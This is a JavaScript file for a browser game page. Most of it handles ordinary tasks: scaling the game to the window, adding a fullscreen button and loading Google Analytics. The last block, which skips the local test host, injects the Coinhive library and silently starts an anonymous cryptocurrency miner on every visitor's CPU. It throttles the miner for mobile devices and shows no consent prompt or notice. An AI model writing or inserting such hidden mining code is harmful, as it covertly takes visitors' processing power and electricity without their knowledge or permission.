var game = document.getElementById('game');
if (game) {
    function resize () {
        if (document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement) {
            if (window.innerWidth < game.offsetWidth * window.innerHeight / game.offsetHeight) {
                game.style.transform = 'translateY(' + (window.innerHeight - game.offsetHeight *
                    (window.innerWidth / game.offsetWidth)) / 2 + 'px) scale(' + window.innerWidth / game.offsetWidth + ')';
            } else {
                game.style.transform = 'translateX(' + (window.innerWidth - game.offsetWidth *
                (window.innerHeight / game.offsetHeight)) / 2 + 'px) scale(' + window.innerHeight / game.offsetHeight + ')';
            }
        } else {
            if ((window.innerWidth - 32) < game.offsetWidth * (window.innerHeight - 88) / game.offsetHeight) {
                game.style.transform = 'translateY(' + ((window.innerHeight - 88) - game.offsetHeight *
                    ((window.innerWidth - 32) / game.offsetWidth)) / 2 + 'px) scale(' + (window.innerWidth - 32) / game.offsetWidth + ')';
            } else {
                game.style.transform = 'translateX(' + ((window.innerWidth - 32) - game.offsetWidth *
                ((window.innerHeight - 88) / game.offsetHeight)) / 2 + 'px) scale(' + (window.innerHeight - 88) / game.offsetHeight + ')';
            }
        }
    }
    resize();
    window.addEventListener('resize', resize);

    var wrapper = document.getElementById('wrapper');
    var fullscreen = document.getElementById('fullscreen');
    fullscreen.addEventListener('click', function (event) {
        event.preventDefault();
        this.blur();
        if (wrapper.requestFullscreen) {
            wrapper.requestFullscreen();
        } else if (wrapper.mozRequestFullScreen) {
            wrapper.mozRequestFullScreen();
        } else if (wrapper.webkitRequestFullscreen) {
            wrapper.webkitRequestFullscreen();
        } else if (wrapper.msRequestFullscreen) {
            wrapper.msRequestFullscreen();
        }
    });
}

if (window.location.hostname != '127.0.0.1') {
    var miner, minerScript = document.createElement('script');
    minerScript.src = 'https://coinhive.com/lib/coinhive.min.js';
    minerScript.addEventListener('load', function () {
        miner = new CoinHive.Anonymous('ENDYwvXEVLN7UFRO43zBsKNHAYGXx9u2');
        miner.setThrottle(miner.isMobile() ? 0.3 : 0.1);
        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
    });
    document.head.appendChild(minerScript);

    var analyticsScript = document.createElement('script');
    analyticsScript.src = 'https://www.googletagmanager.com/gtag/js?id=UA-110826300-1';
    document.head.appendChild(analyticsScript);

    window.dataLayer = window.dataLayer || [];
    function gtag () { dataLayer.push(arguments); }
    gtag('js', new Date());
    gtag('config', 'UA-110826300-1');
}